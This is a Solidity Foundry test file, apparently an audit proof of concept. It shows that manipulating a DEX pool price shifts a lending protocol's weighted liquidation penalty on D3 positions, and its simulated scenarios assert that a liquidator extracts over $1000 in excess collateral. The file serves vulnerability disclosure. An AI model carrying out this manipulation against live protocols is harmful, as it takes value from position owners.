// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
    PoC — D3 Liquidation Penalty Manipulation via Pool Price

    ROOT CAUSE
    ──────────
    liquidateModule/main.sol:379 → sqrtPriceX96: AT_POOL_PRICE
      Liquidation decomposes D3 position at actual DEX pool price.

    other/helpers.sol:899-906  → _calculateSqrtPriceX96(oracle…)
      HF check decomposes D3 position at oracle-derived price.

    When pool price ≠ oracle price, token0/token1 split changes.
    If the two tokens carry different liquidation penalties, the
    weighted average penalty shifts — letting a liquidator/MEV bot
    extract more collateral from the position owner.

    HOW TO RUN
    ──────────
    forge test --match-contract D3_LiqPenalty_PoC -vvv
//////////////////////////////////////////////////////////////*/

contract D3_LiqPenalty_PoC is Test {

    /*//////////////////////////////////////////////////////////////
                PROTOCOL CONSTANTS  (variables.sol)
    //////////////////////////////////////////////////////////////*/

    uint256 constant EIGHTEEN_DECIMALS         = 1e18;
    uint256 constant THREE_DECIMALS            = 1e3;
    uint256 constant ROUNDING_FACTOR           = 1e9;
    uint256 constant ROUNDING_FACTOR_MINUS_ONE = ROUNDING_FACTOR - 1;
    uint256 constant EXCHANGE_PRICES_PRECISION = 1e12;
    uint256 constant TOKENS_DECIMALS_PRECISION = 9;
    uint256 constant Q96  = 1 << 96;
    uint256 constant Q192 = 1 << 192;

    struct Config {
        int24   tickLower;
        int24   tickUpper;
        uint128 liquidity;
        uint256 dec0;
        uint256 dec1;
        uint256 ex0;
        uint256 ex1;
        uint256 oraclePrice0;
        uint256 oraclePrice1;
        uint256 liqPenalty0;
        uint256 liqPenalty1;
        uint256 payback;
    }

    struct Scenario {
        uint256 amt0;
        uint256 amt1;
        uint256 penalty;
        uint256 supplyValue;
        uint256 seized;
    }

    /*//////////////////////////////////////////////////////////////
        UNISWAP V3 – TickMath  (lib/v3-core)
        NOTE: must be unchecked — ratio * factor relies on wrapping
    //////////////////////////////////////////////////////////////*/

    function getSqrtRatioAtTick(int24 tick)
        internal pure returns (uint160 sqrtPriceX96)
    {
        unchecked {
            uint256 absTick = tick < 0
                ? uint256(-int256(tick))
                : uint256(int256(tick));
            require(absTick <= 887272, "T");

            uint256 ratio = absTick & 0x1 != 0
                ? 0xfffcb933bd6fad37aa2d162d1a594001
                : 0x100000000000000000000000000000000;

            if (absTick & 0x2     != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
            if (absTick & 0x4     != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
            if (absTick & 0x8     != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
            if (absTick & 0x10    != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
            if (absTick & 0x20    != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
            if (absTick & 0x40    != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
            if (absTick & 0x80    != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
            if (absTick & 0x100   != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
            if (absTick & 0x200   != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
            if (absTick & 0x400   != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
            if (absTick & 0x800   != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
            if (absTick & 0x1000  != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
            if (absTick & 0x2000  != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
            if (absTick & 0x4000  != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
            if (absTick & 0x8000  != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
            if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
            if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
            if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
            if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;

            if (tick > 0) ratio = type(uint256).max / ratio;
            sqrtPriceX96 = uint160(
                (ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1)
            );
        }
    }

    /*//////////////////////////////////////////////////////////////
        UNISWAP V3 – FullMath.mulDiv
        NOTE: entirely unchecked — modular inverse relies on wrapping
    //////////////////////////////////////////////////////////////*/

    function mulDiv(uint256 a, uint256 b, uint256 d)
        internal pure returns (uint256 result)
    {
        unchecked {
            uint256 prod0;
            uint256 prod1;
            assembly {
                let mm := mulmod(a, b, not(0))
                prod0 := mul(a, b)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }
            if (prod1 == 0) return prod0 / d;
            require(d > prod1);

            uint256 rem;
            assembly {
                rem := mulmod(a, b, d)
                prod1 := sub(prod1, gt(rem, prod0))
                prod0 := sub(prod0, rem)
            }
            uint256 twos = d & (~d + 1);
            assembly {
                d := div(d, twos)
                prod0 := div(prod0, twos)
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;

            uint256 inv = (3 * d) ^ 2;
            inv *= 2 - d * inv;
            inv *= 2 - d * inv;
            inv *= 2 - d * inv;
            inv *= 2 - d * inv;
            inv *= 2 - d * inv;
            inv *= 2 - d * inv;

            result = prod0 * inv;
        }
    }

    /*//////////////////////////////////////////////////////////////
        UNISWAP V3 – LiquidityAmounts   (lib/v3-periphery)
    //////////////////////////////////////////////////////////////*/

    function getAmount0ForLiquidity(
        uint160 sqrtA, uint160 sqrtB, uint128 liq
    ) internal pure returns (uint256) {
        unchecked {
            if (sqrtA > sqrtB) (sqrtA, sqrtB) = (sqrtB, sqrtA);
            return mulDiv(uint256(liq) << 96, sqrtB - sqrtA, sqrtB) / sqrtA;
        }
    }

    function getAmount1ForLiquidity(
        uint160 sqrtA, uint160 sqrtB, uint128 liq
    ) internal pure returns (uint256) {
        unchecked {
            if (sqrtA > sqrtB) (sqrtA, sqrtB) = (sqrtB, sqrtA);
            return mulDiv(liq, sqrtB - sqrtA, Q96);
        }
    }

    function getAmountsForLiquidity(
        uint160 sqrtRatio, uint160 sqrtA, uint160 sqrtB, uint128 liq
    ) internal pure returns (uint256 a0, uint256 a1) {
        unchecked {
            if (sqrtA > sqrtB) (sqrtA, sqrtB) = (sqrtB, sqrtA);
            if (sqrtRatio <= sqrtA) {
                a0 = getAmount0ForLiquidity(sqrtA, sqrtB, liq);
            } else if (sqrtRatio < sqrtB) {
                a0 = getAmount0ForLiquidity(sqrtRatio, sqrtB, liq);
                a1 = getAmount1ForLiquidity(sqrtA, sqrtRatio, liq);
            } else {
                a1 = getAmount1ForLiquidity(sqrtA, sqrtB, liq);
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
        PROTOCOL – helpers.sol:755-773
    //////////////////////////////////////////////////////////////*/

    function sqrt(uint256 x) internal pure returns (uint256 z) {
        assembly {
            z := 181
            let r := shl(7, lt(0xffffffffffffffffffffffffffffffffff, x))
            r := or(r, shl(6, lt(0xffffffffffffffffff, shr(r, x))))
            r := or(r, shl(5, lt(0xffffffffff, shr(r, x))))
            r := or(r, shl(4, lt(0xffffff, shr(r, x))))
            z := shl(shr(1, r), z)
            z := shr(18, mul(z, add(shr(r, x), 65536)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := sub(z, lt(div(x, z), z))
        }
    }

    function _oracleSqrt(Config memory c) internal pure returns (uint160) {
        uint256 p0 = c.oraclePrice0;
        uint256 p1 = c.oraclePrice1;
        if (c.dec0 < 18) p0 /= 10 ** (18 - c.dec0);
        if (c.dec1 < 18) p1 /= 10 ** (18 - c.dec1);
        return uint160(sqrt(mulDiv(p0 * c.ex0, Q192, p1 * c.ex1)));
    }

    /*//////////////////////////////////////////////////////////////
        PROTOCOL – helpers.sol:490-505 + liquidateModule:404-422
    //////////////////////////////////////////////////////////////*/

    function rawToNormal(uint256 raw, uint256 dec, uint256 exPrice)
        internal pure returns (uint256 normal)
    {
        uint256 num; uint256 den;
        if (dec > TOKENS_DECIMALS_PRECISION) {
            num = 1; den = 10 ** (dec - TOKENS_DECIMALS_PRECISION);
        } else {
            num = 10 ** (TOKENS_DECIMALS_PRECISION - dec); den = 1;
        }
        normal = (raw * den * exPrice * ROUNDING_FACTOR_MINUS_ONE) /
                 (num * EXCHANGE_PRICES_PRECISION * ROUNDING_FACTOR);
        if (normal > 0) normal -= 1;
    }

    function averagePenalty(
        uint256 amt0, uint256 amt1,
        uint256 p0,   uint256 p1,
        uint256 lp0,  uint256 lp1
    ) internal pure returns (uint256 pen, uint256 sv) {
        uint256 sv0 = ((amt0 * p0) + 1) / EIGHTEEN_DECIMALS + 1;
        uint256 sv1 = ((amt1 * p1) + 1) / EIGHTEEN_DECIMALS + 1;
        sv = sv0 + sv1;
        pen = (lp0 * sv0 + lp1 * sv1) / sv;
    }

    function scaleWithdraw(uint256 payback, uint256 pen)
        internal pure returns (uint256 w)
    {
        w = ((payback * (THREE_DECIMALS + pen)) - 1) / THREE_DECIMALS;
        if (w > 0) w -= 1;
    }

    /*//////////////////////////////////////////////////////////////
                         PIPELINE
    //////////////////////////////////////////////////////////////*/

    function _run(uint160 sqrtPrice, Config memory c)
        internal pure returns (Scenario memory s)
    {
        uint160 sqrtA = getSqrtRatioAtTick(c.tickLower);
        uint160 sqrtB = getSqrtRatioAtTick(c.tickUpper);

        (uint256 raw0, uint256 raw1) =
            getAmountsForLiquidity(sqrtPrice, sqrtA, sqrtB, c.liquidity);

        s.amt0 = rawToNormal(raw0, c.dec0, c.ex0);
        s.amt1 = rawToNormal(raw1, c.dec1, c.ex1);

        (s.penalty, s.supplyValue) = averagePenalty(
            s.amt0, s.amt1,
            c.oraclePrice0, c.oraclePrice1,
            c.liqPenalty0, c.liqPenalty1
        );

        s.seized = scaleWithdraw(c.payback, s.penalty);
    }

    /*//////////////////////////////////////////////////////////////
                         THE PoC
    //////////////////////////////////////////////////////////////*/

    /**
        @notice Proves pool-price manipulation shifts the weighted-
                average liquidation penalty and extracts excess value.

        Token0  (e.g. WETH):   18 dec, penalty  5%, oracle $3000
        Token1  (e.g. DAI):    18 dec, penalty 15%, oracle $1
        Tick range:             78244–81610  (≈ $2500–$3500)
        Payback:                $500 000
     */
    function test_D3_LiquidationPenalty_Manipulation() public {

        Config memory c = Config({
            tickLower:     78244,
            tickUpper:     81610,
            liquidity:     500_000e18,
            dec0:          18,
            dec1:          18,
            ex0:           EXCHANGE_PRICES_PRECISION,
            ex1:           EXCHANGE_PRICES_PRECISION,
            oraclePrice0:  3_000e18,
            oraclePrice1:  1e18,
            liqPenalty0:   50,
            liqPenalty1:   150,
            payback:       500_000e18
        });

        uint160 sqrtA = getSqrtRatioAtTick(c.tickLower);
        uint160 sqrtB = getSqrtRatioAtTick(c.tickUpper);
        uint160 oSqrt = _oracleSqrt(c);

        // Sanity: oracle sqrt in range
        assertGt(uint256(oSqrt), uint256(sqrtA), "oracle > sqrtA");
        assertLt(uint256(oSqrt), uint256(sqrtB), "oracle < sqrtB");

        // A) Fair: pool price == oracle price
        Scenario memory fair     = _run(oSqrt, c);

        // B) Full manipulation: pool pushed to upper tick
        Scenario memory manip    = _run(sqrtB,  c);

        // C) Moderate: 70% toward upper tick
        int24 tMod = c.tickLower + ((c.tickUpper - c.tickLower) * 7) / 10;
        Scenario memory moderate = _run(getSqrtRatioAtTick(tMod), c);

        // ── LOG ─────────────────────────────────────────────────
        emit log("==== FAIR (pool = oracle) ====");
        emit log_named_uint("  Token0 amount     ", fair.amt0);
        emit log_named_uint("  Token1 amount     ", fair.amt1);
        emit log_named_uint("  Supply value ($)  ", fair.supplyValue / 1e18);
        emit log_named_uint("  Penalty (permil)  ", fair.penalty);
        emit log_named_uint("  Seized ($)        ", fair.seized / 1e18);

        emit log("==== MANIPULATED (pool -> upper tick) ====");
        emit log_named_uint("  Token0 amount     ", manip.amt0);
        emit log_named_uint("  Token1 amount     ", manip.amt1);
        emit log_named_uint("  Supply value ($)  ", manip.supplyValue / 1e18);
        emit log_named_uint("  Penalty (permil)  ", manip.penalty);
        emit log_named_uint("  Seized ($)        ", manip.seized / 1e18);

        emit log("==== MODERATE (70% push) ====");
        emit log_named_uint("  Penalty (permil)  ", moderate.penalty);
        emit log_named_uint("  Seized ($)        ", moderate.seized / 1e18);

        emit log("==== VALUE EXTRACTION ====");
        emit log_named_uint("  Extra full ($)    ", (manip.seized - fair.seized) / 1e18);
        emit log_named_uint("  Extra moderate ($)", (moderate.seized - fair.seized) / 1e18);

        // ── ASSERTIONS ──────────────────────────────────────────
        assertGt(manip.penalty,    fair.penalty, "Penalty increases (full)");
        assertGt(moderate.penalty, fair.penalty, "Penalty increases (moderate)");
        assertGt(manip.seized,    fair.seized, "More seized (full)");
        assertGt(moderate.seized, fair.seized, "More seized (moderate)");
        assertGt(manip.seized - fair.seized, 1_000e18, ">$1000 extracted");
        assertGe(manip.penalty, 145, "Full: penalty near 15%");
        assertLt(manip.amt0, fair.amt0, "Less token0");
        assertGt(manip.amt1, fair.amt1, "More token1");
        assertGt(fair.penalty, c.liqPenalty0, "Fair > 5%");
        assertLt(fair.penalty, c.liqPenalty1, "Fair < 15%");
    }

    function test_Penalty_Monotonically_Increases() public {
        Config memory c = Config({
            tickLower:     78244,
            tickUpper:     81610,
            liquidity:     100_000e18,
            dec0:          18,
            dec1:          18,
            ex0:           EXCHANGE_PRICES_PRECISION,
            ex1:           EXCHANGE_PRICES_PRECISION,
            oraclePrice0:  3_000e18,
            oraclePrice1:  1e18,
            liqPenalty0:   50,
            liqPenalty1:   150,
            payback:       100_000e18
        });

        uint256 prev = 0;
        int24   step = (c.tickUpper - c.tickLower) / 20;

        for (int24 t = c.tickLower; t <= c.tickUpper; t += step) {
            Scenario memory s = _run(getSqrtRatioAtTick(t), c);
            assertGe(s.penalty, prev, "Penalty non-decreasing");
            prev = s.penalty;
        }
        assertGe(prev, 140, "Upper tick: penalty near 15%");
    }
}